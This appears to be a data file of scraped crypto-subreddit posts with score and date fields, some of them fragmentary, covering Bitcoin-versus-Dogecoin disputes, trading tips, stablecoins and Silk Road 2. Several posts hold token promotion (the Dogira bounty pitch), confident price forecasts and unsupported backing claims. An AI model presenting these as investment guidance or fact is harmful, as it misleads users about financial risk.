I think that 99% in crypto are young men, in the 18-35 bracket, who for the first time in their life have some spare cash and hope to get rich easy. Follow the conversation in any social media and the conversation is so juvenile and basic that I cannot take anyone serious. It's a clear signal that this a playground for infantile moon boys, not serious grownups who want to invest in something of value. 

I think that 99% of us do not use any dapps, any defi, they do not make any payments in crypto beyond maybe transferring one token to another on metamask. Where's the utility? 

So what is the point? For the absolute majority it's just about the number going up so that you can sell it back to USD and then spend it some trivial bullshit like a Lambo.  Honestly, I'm reaching the conclusion that this is just a hype industry where young, gullible and greedy idiots (like myself) will give money away to people clever enough to generate a compelling narrative and create new trends for the TikTok generation to spend their money on. Someone, please tell me I'm wrong and tell me WHY I'm wrong.  

If you disagree, please tell me in concrete terms why you believe that Crypto is a worthy industry, what dapps are you using, what real world utility are you getting? Why is it better than the non-crypto options that exist? I know that there are some good ideas for dapps to take over social media, entertainment, gaming, etc etc, but in my limited experience, they all suck.

Syrius Zenon wallet introduction https://youtu.be/t6A7vKhp-MY

based anon explanation What is it: Incredibly fast, almost infinitely scalable state-of-the-art DLT. It combines the block-lattice architecture that was first(?) used by Raiblocks/Nano with a DAG that exists as a separate layer for the consensus. The block-lattice handles the transactions. It's going to be used to scale Web3 dapps as a L1, and also process transactions as a L2 chain.

Who does it: This is an independent, open-source project and will probably be run by a foundation similar to Ethereum and Cardano, but I'm about 99.5% sure its backed by Square. I can enumerate the zillions of times they have hinted as such if I really have to here, but you can search for old biz posts on Zenon here and also on Warosu.

Square will likely use it to scale Bitcoin transactions where the default payment for merchants and Cashapp users is made in BTC, and then they can set it to dollars or pounds or whatever afterwards.

Its open source and not owned by Square, like how Node.js isn't owned by Google but has wide adoption. They'll easily recruit 1000s of legacy web apps for this bc no code changes are needed, and also dapps on Ethereum will easily switch over.",30,2021-04-16 19:01:19,15

Disclaimer: I did get shilled by the Dev’s post on r/Cryptomoonshots days ago and since then being part of the community with stability and communication has been great. We are currently working on New CEX listings. 

So, the biggest catalyst coming up this week is our $20k USDT giveaway for our Marketing Bounty program, running through WhiteBit. This will allow people to share in the prizepool of $20k for promoting Dogira; such as getting tweets or videos about Dogira trending, and generally getting the word out there about the coin.

We will be doing an AMA with a big crypto group (Satoshi Club AMA's coming this week!)

The first round of Investment NFTs did sellout.

Our full roadmap is up on https://dogira.net for anyone interested in taking a read through; and it details our core goals across 2021, with a heavy focus on further NFT ecosystem expansion, alongside delving into Blockchain Native Gaming.

If you're on the fence, I'd recommend checking out the coin at it's current consolidated/cool-off pricepoint; we are currently sitting at 3 cents and been holding for about 36 hours and we've a lot coming ahead this week, and we're all excited to see where it takes us.

I will be writing the full post on Monday as I didn’t go to work today because of real bad vertigo

And that’s usually where I get really descriptive

But to fill you guys in no we didn’t close or the likelihood of closing tomorrow full bearish isn’t gonna happen

We are closing bear neutral and that basically means we don’t have enough information to make a decision yet

We needed to close full bear to see the heavy drop , now August is the catalyst unfortunately

If August closes bearish neutral or bullish then we rally hard to $28,000 x 3 = $84,000 and I start buying up ETH, BTC and other ALTs heavy

If August closes bear then I’m 99% sure we are going down to the low $20’s

https://imgur.com/a/kRMZRJm

You can see in the chart above how I’m tracking and forecasting. Phase 1 of Bitcoin hitting $29,768 was hit in June as opposed to August where i thought we would hit those lows - my shorts printed faster than I thought

The Extreme bear case scenario for me would be closer to the range of $14,000 but that is taking into consideration August closes FULL bear which would indicate another light blue candle on my Reverse MACD like on the chart here: https://imgur.com/a/V3bHA0V (yellow arrow for easy sighting)

**Phase 1:** BTC Closing May Bearish which Signals drop to ~$29,000 within 90 Days - Successful

**Phase 2:** BTC Closing a 3rd Straight Month FULL bearish which would signal a full 70% drop to roughly $20,000 within 250 days of May’s Peak Highs - Unsuccessful

**Phase 3: Bear** BTC Closing its 4th Month either FULL Bearish (light blue candle) to see a continuous drawdown to $20,000 ish

Or

**Phase 3: Bull** BTC Closes Bear Neutral (dark blue candle or Bullish (Bright Red Candle) and BTC rallies to $84,000+ within 250 days of August Close

**Keep in mind that the ONLY reason we are closing Bear neutral is because of that random ass 10%+ gain on BTC last week**

Otherwise this month would have closed FULL bearish and I would have 100% thought we would be seeing ~$20,000 within two months

Because BTC is currently closing the week Bullish and breaking resistance at $39,392 our next Stop for BTC is $46,400 - $48,600

BTC weekly closes on Sunday and I’m about 95% sure as of this post that we are going to see $46-$48k in August.",11,2021-07-31 00:10:04,8
DOGE,CryptoMarkets,Retail companies are more likely to accept stablecoins than coins like BTC or DOGE in case crypto ever goes mainstream,"In a matter of 3 months BTC went from 69k to 32k. That’s a decrease by almost 50%.

This would prove to be catastrophic for any company in case it was actually accepting payments in BTC.

It might be exciting and bullish to think that companies will accept these volatile coins, but the reality is that these companies would much rather prefer something more stable… i.e stablecoins.

Although USDT might be a little troublesome considering it isn’t even audited. But there are always better and safer options like USDC, EURST and UST all of which are audited and 100% backed.

We’re starting to see a lot of adoption recently so this reality of mainstream adoption might not take too long as we’ve expected initially.",2,2022-03-23 17:04:18,3

DOGE,Bitcoin,As a moderator for /r/cryptocurrency... What I see is starting to bother me.,"Yes, pardon the strangely titled thread. I believe more in the fundamentals of bitcoin than any other cryptocurrency on the planet.                

The ""meta shift"" I have seen over the past 7 months bothers me. Nobody wants to talk about bitcoin. Nobody wants to discuss mass adoption of bitcoin. Nobody wants to talk about liberating the Lebanese freelance artist or the Iranian just trying to buy games on steam or the village in rural Kenya that is located a 3-hour-walk away from the closest bank. Nobody wants to talk about DLCs and smart contracts on bitcoin or the best non-custodial lightning network wallets. No one is talking about taproot.                

No one is talking about how the creator of bitcoin never sold his coins. People are forgetting the first cryptocurrency that was ever created. People are forgetting metcalfes law.                 

What I find ultimately more disturbing is that during the 2018-2020 bear market more people were talking about / cared to talk about bitcoin than altcoins. It just feels like a hivemind of ""pump my bags"" and little more.               

This is just a slight rant. It's like everyone there delusionally believes that an altcoin will surpass bitcoin and become the standard. If there is going to be another bear market, I welcome it. Just so we can go back to talking about bitcoin and lightning and the technology aspects of it all.                 

EDIT: I strongly feel as though the majority of the new users that we have accumulated since this bull run began are coming from /r/wallstreetbets and /r/dogecoin. The sad part is, these people are throwing out fundamentals like ""market caps"" and just following all the Elon tweets or they got pulled in because they realized that robinhood can shut down stock trading whenever they want but there could be no such level of consensus among all centralized and decentralized exchanges.              

EDIT 2: ""superior technology"" showed up in 2017 in a slew of different flavors and not a single altcoin actually surpassed bitcoin.                

EDIT 3: I see that there is a cross post of this thread to the cc subreddit. To further refine my claims to the belief that no crypto will surpass bitcoin, I responded to a comment someone else here made with the following: All of these questions summarize ""Why bitcoin is the next bitcoin.'"" 

>Which coin is the ""next bitcoin?"" or in other words, the one coin that will replace bitcoin? Why is it that coin and not bitcoin? And how do you convince all of the banks and the traditional financial system to switch to that coin and not use bitcoin? Why would they switch to that coin and not use bitcoin? Why not use both? Is there a reason not to use both? This is why there will be no ""next bitcoin"" or a coin that replaces bitcoin.",3377,2021-05-20 02:57:23,1388

DOGE,Bitcoin,"Even If You Hate Dogecoin, It Will Still Provide An Interesting Experiment","A lot of us here hate Dogecoin, as it is yet another altcoin created as a joke that gained a lot of attention and use. Many feel as if it does not deserve the attention it gets.

However, in addition to attracting a new crowd to cryptocurrency in general, I do think it will allow for a few  interesting experiments. Dogecoin has a couple differences from Bitcoin that could provide us with interesting results. The first is that its block reward schedule is halved significantly faster and bottoms out at 10,000(~2% of initial reward). The second is that it has significantly different PR despite being almost exactly the same thing.


Dogecoin's block reward hits its lowest point in approximately 8 months. At this point, we will be able to see if a cryptocurrency can stay secure off of primarily transaction fees. Bitcoin won't reach this point where transaction fees exceed raw rewards for about 20 years. Since ASICs for scrypt will likely be the primary means of mining by then, we will see if it remains secure with everyday GPU miners being unable to hop in to save it. Despite its low market cap, Dogecoin sees frequent usage, with its blockchain growing roughly as fast as Bitcoin. A double spend attack will perhaps become profitable in a few months, and we may see the effects it has on a currency.

The second thing we will learn from it is exactly how important PR is. Despite being the exact same technology, Dogecoin has a much more positive tone associated with it. Many first heard of Bitcoin through information regarding the Silk Road, MTGox, hacked exchanges, and other negative aspects. They may not have researched much more. Dogecoin, on the other hand, gets the most media attention through crowdfunding acts of charity or advertisement, as well as sharing. While Dogecoin can suffer from the exact same things Bitcoin has, it is still seen in a positive light. 

Point being, we can learn from the mistakes altcoins make. Consider them like a test. Sure, people are throwing money into them and gaining/losing money, but we can learn a lot from them. Instead of crying about them being clones and scams, just avoid them if you don't like them, and observe. Some also provide interesting technology that Bitcoin might incorporate itself. I do believe the Litecoin developers have helped solve problems with Bitcoin in the past. As an open source protocol/program, I do think sharing is important. We should encourage sharing of code and work, instead of whining about copying and theft.

**Disclaimer:** please don't think I'm promoting altcoins. I do  dislike a lot of premined scamcoins like Coinye and other novelty ones. But I do think some make innovative changes that we may learn from. It's the beauty of open source programs. They take from us, but they may give back.

DOGE,Bitcoin,10 things I wish someone had told me when I was learning to trade crypto,"While I consider myself an amateur trader and a small-scale investor, over the 2+ years of trading crypto I've learned some things I'd like to share with you all, but mostly with those who are making their first steps into the uncharted cryptoland. 

1. Just as with anything else in life, **trading cryptocurrencies is context dependent**. That means you should remain a healthy sceptic about general truths, universal rules and things that ""everyone knows"". Consider the famous ""buy low sell high"" dictum. The definition of high and low is subjective in most cases since it depends on your timescale, goals and trading strategy. If you’re a hodler, as are many of the fellow redditors here, your high and low will differ dramatically compared to the day trader's.

2. It is for the same reason that **bulls and bears don't really matter**. Whether you're 'bullish' or 'bearish' depends on your strategy and timescale. Consider this: to someone hodling BTC since 2013 a dip here or there (even a prolonged one) makes little difference because the price of BTC over the time continues to grow monstrously – you can call it one long-term bull market.

3. At some point, you'll bump (or you already have) into something that is called 'technical analysis'. Let me save you some time (and money, probably) by telling you this: **technical analysis is neither technical, nor is it very analytical**. While many traders regard TA to be a scientific way (supposedly based on mathematics) to read and predict the market moves, TA has little to do with any formal science. Differently from the surrounding physical world, we are not aware of any physical laws that govern our human behavior, including markets. If it was possible to mathematically calculate and with certainty predict market moves, the big buck guys in Wall Street would have already done it. Think about the major financial crises for a moment – just like the Spanish Inquisition, nobody (well, almost nobody) ever expected one. Does it mean TA –  trends, chart patterns, MACD, RSI, Elliot wave count, etc. – is a complete rubbish? I wouldn't go as far as to claim that. It is somewhat helpful – if only a little, TA still gives you a feel of the current market mood. TA also does one other thing pretty accurately: it graphically represents historic data of human behavior in the financial markets. Surely you can benefit from that? Or do you? This brings me to another point...

4. **Beware of historical analogies and 'I knew it all along' thing**. As humans, we are prone to hindsight bias, a tendency, after an event has occurred, to see it as having been easily predictable. We are all blinded by hindsight bias because our brain looks for simplistic linear link between cause and effect. This way when an unexpected event happens, the brain uses the knew-it-all-along mode to cope with cognitive dissonance and make sense of the surrounding world. While trading hindsight bias harms you in two ways: a) it drains you psychologically for not making 'the right' decisions in the past, and by luring you into oversimplified historic analogies, b) it creates a false sense of investment security at the present time. Just look at everyone complaining they've sold their BTC at the worst possible time (as a matter of fact, I am no different – I still autodestructively loathe my decision to liquidate a large portion of my BTC portfolio after the BTC price hiked to 8k). It is also very tempting to think you wouldn't miss 'the next bitcoin'. The problem is, though, that it is incredibly difficult if at all possible to spot such an opportunity. You have to be either lucky or extremely well informed (and lucky) to capitalize early on such opportunity. In reality, it's very difficult to differentiate between useless information (noise) and something that truly matters (signal). Which brings me yet to another point...

5. **Stop being a news junkie and start filtering what you read/hear/see**. If you don't, at some point in time the quantity of consumed news will start to impact your decisions and it will begin to negatively correlate with the net gain of your investment portfolio. Instead of reading news nonstop, better educate yourself – dive deep into the market fundamentals and the technology you're dealing with. This way it will be easier for you to spot new lucrative investment opportunities when the time comes.

6. **Accept the fact that idiots also happen to make lots of money and move on**. Multiple times too, if they're lucky ones. However, the net worth of (lucky) idiot doesn't mean you should imitate him and become one. Some two months ago a Dutch father of two young children sold his family's house, bought BTC and other cryptocurrencies, and relocated his family to a rented property. After the recent spike in BTC price the guy's net worth must have increased substantially. So, is he an idiot? Absolutely! It is only a question of time before he ruins his own and his family's life with some incredibly reckless financial decision.

7. **Try to understand the motives governing your decisions and act (or don't act) accordingly**. If your actions are about to be driven by extreme emotions such as fear, panic or excitement – stop immediately and reevaluate the situation. Otherwise you'll end up belonging to the FOMO buyer/panic seller club aka the money losers. If you want to stay on the earning side long term, you must keep your head cool and think clearly.

8. **Day trading is probably not for you**. Consider this: evidence in neuroscience research shows that we are a loss-averse species. For this we should thank our stone age ancestors who had barely enough food, shelter and belongings to survive in a very adverse world. Losing even a little of what they had meant their existence was in jeopardy. This explains why contemporary humans prefer avoiding financial loss to making financial gain. Neuroscientists claim that losing money activates the same area of the brain that responds to mortal danger. This is why in order to do day trading you must have A LOT of self-control and balls of steel – there are many ups and downs during a single day. It drains you emotionally, you end up being addicted to adrenaline, your fiancée hates it, and the hodlers will probably outperform you in the long run anyway.

9. **Volatility is your friend**. Over time BTC volatility makes the coin stronger, not weaker. While wild swings in price makes BTC almost impossible to use as a currency, volatility is good from the financial asset point of view. Traders and investors dealing with BTC get used to huge and sudden price hikes and dips. Unlike for any 'stable' stock of any prominent multinational corporation, even substantial and unexpected shocks will not undermine the confidence in BTC. BTW, best of luck to everyone planning to short BTC. :)

10. **Make small mistakes, learn from them, get wiser, err less**. In your childhood days, you needed the experience of burning your hand with fire so that for the rest of your life you wouldn't need to think about the painful experience. That information is now hardwired in your brain and helps you to avoid getting harmed. If you've just started trading crypto, expect to make mistakes and prepare to learn from them. It's only after you get into FOMO, get panicked big time, take too big a risk, get out too early only to jump in at the worst possible time, ONLY and ONLY then you'll start to improve.

DOGE,Bitcoin,Explanation of Dogecoin for /r/bitcoin,"I see a lot of confusion with the old school Bitcoiners, and I'd like to try to explain what just happened in the past 2 weeks, so maybe there can be peace between the communities. :)

Like many of you, we found out about Dogecoin by reading the altcoin forum on bitcointalk, and it looked like just another altcoin, but with what looked like a joke like Vaginacoin, Shitcoin, Bernankoin, etc. but less tasteless than the first 2. Dogecoin may have started as a joke, but what happened is anything but a joke.

My first point: Dogecoin has drawn a lot of people into cryptocurrency, many of which have never used Bitcoin. Where have these people been all this time? I don't know, but for some reason they don't care about Bitcoin, but love Dogecoin.

Sample posts from obvious new people:

http://www.reddit.com/r/dogecoin/comments/1tc4kf/what_is_this_type_of_chart_called_how_do_you_read/

http://www.reddit.com/r/dogecoin/comments/1soeou/so_a_quick_question_about_a_backup/

My 2nd point: Dogecoin has fostered a culture around it, which is different than Bitcoin.
While over here in /r/bitcoin we shun memes, they encourage them. Here's what they think of you:

http://www.reddit.com/r/dogecoin/comments/1tcym7/rbitcoin_in_a_nutshell/

http://www.reddit.com/r/dogecoin/comments/1tcajl/well_somebodys_gotta_do_it/

So, I just wanted to make the point that this is what makes Dogecoin such a hot item, that is different than the dozens of altcoins. It is for people that want in on Bitcoin, but can't stand you guys. They have a point, you guys are a bit too serious. Can't you watch bitcoinity all day and still laugh at memes? Has money made you forget how to joke around? The crowd surrounding Dogecoin values fun, so that conflicts with this community, and that's fine to disagree, but at least try to understand the other side. Its not a mockery of bitcoin, it is the desire to play with bitcoins but having a lot of fun while doing it. The culture here is a lot more hostile.

It's shit like this /r/bitcoin that proves my point:
//www.reddit.com/r/Bitcoin/comments/1t9d40/dogecoin_are_you_kidding_me_im_all_for_altcoins/",40,2013-12-21 00:40:59,126
DOGE,Bitcoin,Why I am leaving r/Dogecoin and going back to BTC,"A few hours ago Antonopoulos posted a [tweet](https://twitter.com/aantonop/status/432635743794507777) regarding the sentiments that a few members of the Dogecoin community have towards Bitcoin. Ordinarily I would defend the Dogecoin community as being a generally happy and jovial bunch, even if quite silly on more than occasion. People are having a good time, and in the past few weeks I've come to appreciate the unique blend of kitch, investment, child-like wonder, and generosity.

However, recently I've noticed the same shift Antonopoulos has. Whereas before the Dogecoin community was open to outsiders and new ideas we seemed to have lost our way, instead reveling in our own success and becoming quite arrogant. Perhaps we are becoming resentful of others who do not seem to understand us?

I suppose the new attitude is that [we don't need Bitcoin](http://www.reddit.com/r/dogecoin/comments/1x54xi/embracing_the_bitcoin_community/). (I posted that a few days ago. Not a single reponse or vote.) The same day [I posted some ideas](http://www.reddit.com/r/dogecoin/comments/1x2mp2/making_a_userfriendly_dogecoin_experience/) on making a more user-friendly Dogecoin experience. 69 vote score and 50 comments. Now at least we can see how much r/dogecoin thinks of itself and no other.

So after a few days of thinking about this I posted, ""[Why does the Bitcoin Center welcome Dogecoin but /r/bitcoin does not? (Rant)""](http://www.reddit.com/r/dogecoin/comments/1xekel/why_does_the_bitcoin_center_welcome_dogecoin_but/) in order to open a dialogue about how an increasing number of Dogers seem to feel about Bitcoin. Again, no response (as of this writing). No upvotes or downvotes. If we think Bitcoin is so bad for whatever reason, why are we beginning to act worse than we think they are?

I would rather post something like this in r/bitcoin and at least get some feedback and constructive criticism than be ignored in r/dogecoin because they can't be bothered to think about anything serious for a moment that doesn't involve charity. I'm almost inclined to suggest a joint charity drive with Bitcoin to promote solidarity but I already know what kind of response that would get in the Dogecoin community. We now seem to have *charity for vanity*, and it's not a good thing. How can rational thought possibly compete against [this](http://www.reddit.com/r/dogecoin/comments/1xcnpy/how_to_draw_a_doge/) and [this](http://www.reddit.com/r/dogecoin/comments/1x4xiz/test_gif_please_ignore/) in such a community?

I was strangely attracted to r/dogecoin at first, when exploring the trivial and making money at the same time was entertaining. But no more. I'm going to excuse myself from it, sell my ~22MM shares, consider putting half into [Karmacoin](http://karmacoin.info/) as a more reasonable, more future-proof alternative with a similar concept (and a dev that doesn't surprise) along with putting half back into BTC as it makes its way up again.

When the DOGE price takes a significant hit we seem to pretend that we're in it just for the fun, and downvote others who talk about price. A great many of us are, indeed, and continue to tip like there's no tomorrow. The price begins to climb again the past day or so and I can't count the number of posts exclaiming how great it is and how good they feel. We're even beginning to think that the community's financial resources [can do just about anything](http://www.reddit.com/r/dogecoin/comments/1xg186/emergency_we_must_fund_2_audience_members_to_wear/). I don't know how corruption and unethical behaviour begins but I'm willing to bet that it begins when this kind of attitude starts cropping up. The choice of the mascot was prophetic, because so many of us [from the mods](http://www.reddit.com/r/dogecoin/comments/1x6vhr/at_5pm_est_someone_from_4_paws_for_ability/) on down are starting to beg like dogs. A community that encourages begging soon becomes overrun by voluntary homelessness, lethargy, and scum. A jerk that begs whilst smiling in your face and laughing is not good company. I really hope r/dogecoin doesn't reach that point.

(If anyone from r/dogecoin is reading this, I'll still honor the contest I created but I find it really telling that a user with [200 million Dogecoins](http://www.reddit.com/r/dogecoin/comments/1x84j3/i_have_200_million_dogecoins_ask_me_anything/) (around USD$300,000 worth) could [delete a comment](http://www.reddit.com/r/dogecoin/comments/1x9322/giving_away_200000_doge_to_10_people_that_upload/) after saying he donated 400,000 to the official video contest and I asked if he could donate 200,000 to the winner of mine if it received over 1 million views. Surely there must be a better way to say no?)

DOGE,Bitcoin,"After seeing dogecoin's nascar, would the folks from r/bitcoin be interested in sponsoring a professional athlete?","My friend is a professional surfer who recently lost his sponsorship from billabong after around 10 years riding for them. He just bought a house a couple of years ago and very recently and and his girlfriend have just had a kid and I imagine he's feeling pretty uncertain about what the future holds for him at the moment.

I haven't spoken to him yet but I was wondering what people thought about perhaps getting him an address and some sponsorship from our community so that he could continue his career and simultaneously promote bitcoin to a crowd that I think could have a lot to benefit from adopting bitcoin.

I've been travelling for the last 9 months and bitcoin was extremely useful for me on several occasions. 

1. I wanted to purchase a car but my ATM withdrawal limits meant that I could only withdraw $1000 a day. I was under a bit of a time imperative and only had a couple of days to find and buy a car before beginning a road trip and I wouldn't have been able to get enough local currency out to pay for it. Enter bitcoin.... I signed up to localbitcoins.com, found a buyer in minutes and voila, I had $3000 local CAD by the end of the first day. 

2. I left some of my surfboard and gear with a friend I was travelling with as I was planning on meeting back up  with them however, plans changed and I didn't end up getting back to meet them. I had him FedEx my gear from Mexico up to the States but I didn't have any AUD to transfer to him to pay him back, nor did I have the means to get him Pesos or USD. Enter bitcoin and within a couple of seconds I have reimbursed him for the favour.

3. I was owed some money in CAD from a friend, however if they paid me back into my Canadian bank account I would have had to pay some silly amount to have a couple of hundred bucks wire transferred to my Aussie bank. Enter bitcoin, and I simply had them purchase some coin on localbitcoin in Canada, send them to me where upon receiving them I could change them over for AUD locally. 

I appreciate the fact that I probably lost a bit of money along the way with less that ideal exchange rates on localbitcoins however, for the sheer convenience of avoiding WU and the Currency Exchanges and being able to avoid banks, I'd happily do it again. 

International surf travellers and the international travel community in general could benefit a lot from adopting bitcoin. It could eliminate the need for travellers cheques, or prepaid visa travel cards, or simply carrying around big chunks of cash. As the exchange rate stabilises and more bitcoin ATM's pop up in capital cities, airports, etc. the accessibility and practicality of using it as your main store of wealth will increase. 

I imagine the publicity would be a positive as many people see the ฿ across the nose of his board and start asking questions. He's one of the best big wave surfers around at the moment and gets a lot of photos in magazines and is often granted wildcards into events such as Pipemasters and Teahupoo.

Anyway, it's just a thought, but I'd be curious to hear some feedback on it.

DOGE,Bitcoin,"Arthur Nakamoto: My brother, Dorian Satoshi Nakamoto...","Mis-quoting and blatant lies are unfortunately the journalistic world that exists today. I am just a humble handsome Asian man who is confused as to how a female asshole can become transferred onto my brother's rear end. But I saw with my own eyes from released video that there is a surgeon operating without an ethical or moral license to do exactly that.

I and my immediate family were frightened due to obvious safety concerns, angered by our privacy being invaded and highly concerned over a gentle man trying, trying to recover from his life threatening health concerns. He was so private that he did not tell me when he was going through his health threats, only told me quietly when I visited the house in Temple City to take our mother for lunch. And I am his blood brother.

I recall as a child that I looked up to Dorian, who I believe is many times smarter than I am. He taught me as a toddler, protected me from harm, shared with me Manga, the Japanese comic books and made up fantastic stories til I fell asleep. I am forever indebted to him in saving my life when I was 9 years old. He probably doesn’t remember anymore, but I do and that’s what matters to me.  I called the writer an asshole and told her to leave my brother alone but the whole world did not read that, why?  Dorian can be stubborn and be an asshole but then I am telling the whole world right here and now that I and only 2 other people in the whole world can say that to him and we are automatically forgiven by him in an instant. He can call me an asshole too and has and maybe a few “idiot” or “morons”, but you know, he was probably right and can prove it. That’s private. 

 How dare this Leah demean, belittle the comforts of an old man in poor health who has barely enough money to feed himself and takes gentle care of our 93 year old mother in a modest house. To act and publish with carefully studied thought along with professional profilers, editors who calculated greed to ultimately endanger my brother's health and his physical safety. To be callous enough to place the safety of our 93 year old mother as a person of no consequence? Their collective act that published their magazines and follow-up public reports speak volumes of the motivation tied to greed. Who is going to be responsible in their safety, her, the executives at Newsweek, the entire Journalistic community? Yes, I place Leah McGraw Goodman and Newsweek and all news organizations that had joined in the feeding frenzy to be held responsible for their blatant and open carelessness.

I understand that I will be mis-quoted in this post and that I will be made out to be the brother who is the asshole remark guy. I can and will have no choice that to be slandered and live with that.  What I want to make clear is that I am pleading, no, begging for all to allow Dorian to live whatever life he has left to live it in dignity, peace and in private. To let him play with his trains and obsess over being treated to free lunches that he craves for some reason since his stroke. Funny thing is that growing up we were always hungry because there was never enough and lunch was our largest meal. What do I have to do? Show everyone my bowl legs due to malnutrition? His legs which are worse? What lower level of indecency is required to quench their thirst for what I cannot fathom? 

Do you know what's a real bitch (I am welling with tears right now) is?   I cannot physically go to see him and my mother. To come together as a family to support or call for fear of my immediate family being in physical danger.  I can’t go over there to bring groceries or have a private discussion.

Edit: 
I have found a picture of me and my brother. I hope this evidence is more concrete.

DOGE,Bitcoin,Of Bitcoins and Dogecoins: A New Etiquette for Tipping,"Let’s imagine something for a second.

In this hypothetical situation, we’re close friends. I randomly come up to you and give you a coin worth 50 cents. Puzzled, you ask me why I did this - to which I reply that it’s just a random present.

Even though I have given you something for free, chances are you’ve come away from this experience with a negative opinion of me. Either way, you probably think I’m weird.

Let’s expand the hypothetical now.

Let’s pretend this is a coin that you cannot easily convert into USD - doing so would require going to your bank and handing them your social security number and driver’s license. It’s also got some magical properties - you can push it into your monitor and it will travel across the internet to wherever you would like it to.

You cannot spend this money at almost any brick-and-mortar store, but there are stores online that will accept it.

Here is the question: what is the minimum amount of money this coin would have to be worth in order for you to be happy to receive it?

In my opinion, an opinion that is apparently shared by most others I’ve asked, that number is this: **$5**.

Why $5? It’s just enough money to buy something cool and it still creates enough of a challenge that it’s sort of fun looking for things to buy with it. It’s also just enough to be considered a serious amount by people.

You’ve probably figured out by now that the magical coin I’m referring to represents (most) modern cryptocurrency. Most cryptocurrencies have bots that allow you to “tip” other people small or large amounts of cryptocurrency, which is ridiculously awesome and fun. It spreads good-will and it’s an interesting way to spread the word about digital currencies. Unfortunately, there’s a flaw with how this is currently happening.

People are tipping small amounts to people that have nothing to do with cryptocurrency - anywhere from 0.05¢ to 50¢. This isn’t a problem within the cryptocurrency community - lots of people tip there, so chances are you will eventually accumulate enough to buy something. Even if you don’t, tipping is fun and makes people happy within that community.

The problem is once someone receives a tip that they can’t spend on something, the one thing they can do with that tip is pass it on to other people. This is something every tipbot is *excellent* at. They can take that $1 tip they received and spread the joy onto 10 other people - and they think they’re making those people really happy.

Great, now 10 people have 10 cents of currency that they have no idea what to do with - and you can do even LESS with 10c than you can with $1 - but they can tip! Unfortunately, they don’t have enough to make it worthwhile… unless they tip in a tiny amount like “bits” (look how divisible my cryptocurrency is!).

Many people think these kinds of tips showing up outside of the cryptocurrency subreddits is a good thing.

No part of this situation is good for Bitcoin and other cryptocurrencies.

No part of this situation is good for ChangeTip and other tipbots.

We need to encourage people to follow this basic rule.

Big, meaningful and interesting tips and donations provide great publicity for cryptocurrency and ChangeTip. I think it’s ridiculously awesome that I can throw change at people across the internet, I really do. But this situation has to change.

If you have less than $5, either buy Reddit ads or save the money. Or donate it to somewhere with a need for it.

If you want to help cryptocurrency succeed, tip frequently in cryptocurrency subreddits and to anyone that will actually appreciate it. Outside of that, give generously to your friends and to others - in meaningful amounts.",16,2014-12-31 02:03:32,73

DOGE,Bitcoin,"Why DOGECOIN is a hostile threat to bitcoin, and why it should be ignored/marginalized by serious members of the crypto wealth community.","I will try to keep my thoughts brief.

1) Whereas other altcoins are inspired by Bitcoin's success and aspire to live up to that success, dogecoin is a clone coin born of mockery: look, *anyone* can create a crypto, it can even be based on a frivolous meme, and all the behaviors that make bitcoin intriguing (such as the bitcoin tip bot) can be done with dogecoin too! Here, look, I'm tipping comments that aren't even insightful! Because we're a joke and we know it! All cryptos are a joke! If this isn't a PR campaign from banks to sully bitcoin's early reputation with mainstream consumers, it might as well be one.

2) ""We're just a fun loving community of people exploring digital currency."" This sort of line is repeated so often when dogecoiners are called out for their spam, intrusion into conversations that don't involve them (i.e. spamming the Google Moderator discussion about how Google could integrate bitcoin), etc that it seems like part of a script.

3) ""Dogecoin lifts up all cryptos, including Bitcoin!"" This is another seemingly scripted response from the dogeheads. It is flatly untrue; that's like saying that sales at a Ohio McDonald's help Wolfgang Puck's career, because they're both in the restaurant business.

4) ""But dogecoin is COOL right now, don't hate!"" When something is cool, you find yourself thinking about it even when not prompted or asked to. Many members of this subreddit probably identify with that; how often do we find ourselves thinking about bitcoin even when away from the computer?

Spamming every thread on the Internet that even tangentially mentions digital currency is NOT COOL. There's nothing viral, network effect about that.

5) Aside from the trolls, I think a small subset of dogeheads are genuinely naive or misguided. They are intrigued by the Bitcoin story, and rather than realizing that Bitcoin is still quite cheap compared to where it will be as end-to-end adoption increases, they think dogecoin is a way to relive that expansion. This naiveté is similar to the amateur investors who want to invest in Microsoft or Google, but are swindled by some newsletter into investing in an unknown Canadian accounting software company because it's ""in the same sector, and a rising tide lifts all boats!"" or some nonsense like that.

They deserve to be treated with a bit of patience, and hopefully steered toward a crypto that won't wipe out all of the money they've put into it (likely as no meme maintains its pull for very long). 

But the other dogeheads, the ones who are malicious, dumb trolls bitter and confused by Bitcoin's success, deserve a downvote and a turn of the head. ",0,2014-01-25 19:41:09,55

This will cover a full body wrap on the #98 car in a race of choice (currently looking at Talladega). This will bring a lot of attention to Dogecoin as it will likely be heavily reported on.

This is good. Many of you may hold apathy or even contempt for Dogecoin, but regardless it's easily argued that Dogecoin is a great introduction to the concept of crypto currency. Many new Bitcoiners nowadays have started at shibes, so publicity for Dogecoin will serve to publicize Bitcoin.

This is great, the issue arises when people assume /r/bitcoin MUST become another charity, tip & sponsorship driven subreddit but its not needed.

DOGE,Bitcoin,It is clear that Silk Road 2 funds were stolen by the operators,"The transaction malleability issue in bitcoin isn’t something that makes new transactions just generate on their own.  It means that if you’re able to modify a tx hash and broadcast it out, you can *claim* that the transaction never happened, if the sender’s client hasn’t been configured properly to keep track of modified transactions.

The only way to then generate a 2nd transaction to make up for the first one, is to *manually report the renamed tx as lost to the sender*, who then has to go and *manually* send out a new one.  In reality, malleability is not actually an issue with bitcoin, it is an issue with the operators responsible for sending transactions.

There is no possible way they would have manually pushed out so many malleable payments that their balance went to zero.  What they’re claiming here is that the attacker was able to do it on their own, without having the operators manually process 2nd payments.

There are a few options here, none of which add up to what the SR2 operators are claiming:

- A hacker got the bitcoin, but it was an old school private key or database break-in, not anything to do with malleability
- The SR2 system was specifically designed to somehow automatically re-send transactions for which it could later not find the original tx hash
- The operators of SR2 see the malleability issue as a cover for their theft

#1: The SR2 operators seem pretty confident that it was not a regular prvky/db theft so why not take them at their word?

#2: This is tantamount to a malicious implementation anyway, so if it were programmed like this, which would be beyond stupid, it should equate to the operators being guilty of the theft themselves anyway

#3: The only reasonable conclusion

Their talk of honesty and integrity was and is a ruse.  This operator should never be trusted again for anything.

Anyone else have an alternative explanation?  If they're innocent, they have some explaining to do.",698,2014-02-13 21:16:11,280

DOGE,Bitcoin,"Announcement! Newcoin! Proof of Burn, value pegged to BTC, *new* MANUAL MINING PROTOCOL, super low price point, perfect coin to incentivize newbie crypto adoption like Dogecoin! /s","Several posts today about Dogecoin and how welcoming it is to newbies. One big takeaway is that people like having tens to hundreds-of-millions of units of a coin, not fractions of one. Therefore, I decided today was the perfect day to launch my newcoin[1]. Here are some of the great characteristics:

